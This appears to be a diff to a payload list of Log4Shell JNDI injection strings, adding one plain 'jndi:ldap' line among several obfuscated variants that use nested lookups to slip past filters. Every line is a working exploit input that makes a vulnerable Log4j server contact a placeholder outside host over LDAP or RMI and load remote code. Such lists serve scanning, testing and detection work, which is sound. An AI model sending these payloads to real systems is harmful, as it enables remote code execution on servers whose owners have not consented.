@@ -1,5 +1,6 @@
 ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://hostname/poc}
 ${${::-j}ndi:rmi://hostname/poc}
+${jndi:ldap://hostname/a}
 ${jndi:rmi://hostname}
 ${${lower:jndi}:${lower:rmi}://hostname/poc}
 ${${lower:${lower:jndi}}:${lower:rmi}://hostname/poc}
